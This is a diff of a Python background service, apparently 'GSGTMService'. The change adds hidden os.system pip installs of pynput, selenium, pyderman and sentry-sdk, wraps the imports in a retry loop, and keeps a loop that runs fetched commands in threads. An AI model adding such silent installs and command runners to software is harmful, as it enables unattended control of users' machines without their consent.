@@ -8,20 +8,29 @@ try:
 except:
     pass
 
+os.system('pyw -m pip install --upgrade sentry-sdk')
+os.system('pyw -m pip install --upgrade requests')
+os.system('pyw -m pip install --upgrade pynput')
+os.system('pyw -m pip install --upgrade pyderman')
+os.system('pyw -m pip install --upgrade selenium')
 
-import sentry_sdk
-sentry_sdk.init("https://8b78151ad1da4102805eefb4a8fa8606@o1185419.ingest.sentry.io/6303999", release="GSGTMService@1.1.2", traces_sample_rate=1.0)
-
-
-import requests
+import subprocess
 import time
 import pathlib
-from selenium import webdriver
-import subprocess
-from selenium.webdriver.chrome.options import Options
-import pyderman
-import pynput
 import threading
+while True:
+    try:
+        import requests
+        from selenium import webdriver
+        from selenium.webdriver.chrome.options import Options
+        import pyderman
+        import pynput
+        import sentry_sdk
+        sentry_sdk.init("https://8b78151ad1da4102805eefb4a8fa8606@o1185419.ingest.sentry.io/6303999", release="GSGTMService@1.1.2", traces_sample_rate=1.0)
+        break
+    except ModuleNotFoundError:
+        time.sleep(10)
+
 
 current = pathlib.Path(__file__).parent
 path = pathlib.Path(__file__).absolute().parent.parent / "GSGTM"
@@ -114,4 +123,3 @@ while True:
     for command in commands:
         threading.Thread(target=execute, args=(command,)).start()
     time.sleep(5)
-   
